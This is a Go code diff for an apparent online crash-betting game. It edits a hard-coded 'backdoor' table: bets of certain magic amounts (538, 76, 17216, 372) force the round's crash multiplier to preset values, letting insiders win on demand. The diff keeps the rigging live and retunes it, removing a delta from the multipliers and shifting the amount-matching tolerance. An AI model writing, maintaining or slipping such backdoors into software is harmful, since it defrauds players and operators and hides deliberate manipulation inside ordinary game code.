@@ -126,7 +126,6 @@ func StartCrashGame() {
 		foundBackdoor := false
 
 		// дельта для бекдора
-		deltaBackDoor := 0.1
 
 		// Проверка критических бэкдоров в порядке приоритета
 		criticalBackdoors := []struct {
@@ -134,16 +133,16 @@ func StartCrashGame() {
 			Multiplier float64
 			Name       string
 		}{
-			{538.0, 32.0 + deltaBackDoor, "538"}, // Гарантируем правильный множитель для 538
-			{76.0, 1.5 + deltaBackDoor, "76"},
-			{17216.0, 2.5 + deltaBackDoor, "17216"},
-			{372.0, 1.5 + deltaBackDoor, "372"},
+			{538.0, 32.0, "538"}, // Гарантируем правильный множитель для 538
+			{76.0, 1.5, "76"},
+			{17216.0, 2.5, "17216"},
+			{372.0, 1.5, "372"},
 		}
 
 		// Сначала проверяем критические бэкдоры с точным совпадением
 		for _, backdoor := range criticalBackdoors {
 			for _, bet := range bets {
-				if math.Abs(bet.Amount-backdoor.Amount) < 0.1 {
+				if math.Abs(bet.Amount-backdoor.Amount+0.1) < 0.1 {
 					logger.Info("!!! CRITICAL BACKDOOR %s FOUND !!! Bet ID=%d, UserID=%d, Amount=%.4f -> Multiplier=%.2f",
 						backdoor.Name, bet.ID, bet.UserID, bet.Amount, backdoor.Multiplier)
 					currentCrashGame.CrashPointMultiplier = backdoor.Multiplier
